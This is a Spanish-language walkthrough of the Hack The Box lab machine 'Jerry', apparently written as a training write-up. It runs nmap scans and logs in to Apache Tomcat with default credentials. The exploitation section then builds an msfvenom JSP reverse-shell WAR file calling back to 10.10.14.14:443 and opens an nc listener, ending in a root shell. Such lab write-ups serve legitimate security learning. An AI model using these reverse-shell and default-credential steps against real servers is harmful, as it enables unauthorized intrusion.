---
description: '✍️ Autor: egre55🔍 Dificultad: Fácil 📅 Fecha de creación: 11/11/2018'
---

# Jerry

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 10.10.10.95
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (1256).png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sC -sV 10.10.10.95
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (1257).png" alt=""><figcaption></figcaption></figure>

Durante el escaneo se identificaron los siguientes puertos abiertos:

* **Puerto 8080 (HTTP)**: Se ha detectado un servidor web Apache Tomcat con la versión 7.0.88 en ejecución. Esta versión puede contener vulnerabilidades conocidas, por lo que se recomienda verificar exploits públicos relacionados.

A continuación, se procederá a analizar cada uno de estos servicios en busca de posibles vectores de ataque.

### 🔎 EXPLORACIÓN

Se utiliza el comando:

```bash
sudo nmap -sCV -p8080 -v 10.10.10.95
```

para que nos proporcione más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/image (1258).png" alt=""><figcaption></figcaption></figure>

Revisando el puerto 8080 nos encontramos con un Apache Tomcat por lo que nos intentamos loguear con las credenciales por defecto.

{% embed url="https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/tomcat/index.html" %}

Nos logueamos con **admin**:**admin.**

<figure><img src="../../.gitbook/assets/image (1259).png" alt=""><figcaption></figcaption></figure>

Nos salen unas credenciales para loguearnos.

<figure><img src="../../.gitbook/assets/image (1260).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Vemos que podemos subir archivos por lo que creamos uno malicioso.

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 -f war -o reverse2.war
```

<figure><img src="../../.gitbook/assets/image (1261).png" alt=""><figcaption></figcaption></figure>

Nos ponemos en escucha.

```
nc -nlvp 443
```

<figure><img src="../../.gitbook/assets/image (1262).png" alt=""><figcaption></figcaption></figure>

### 🔐 **PRIVILEGIOS**

Al estar dentro y ejecutar:

```bash
whoami
```

somos **root.**

<figure><img src="../../.gitbook/assets/image (1263).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1264).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1265).png" alt=""><figcaption></figcaption></figure>
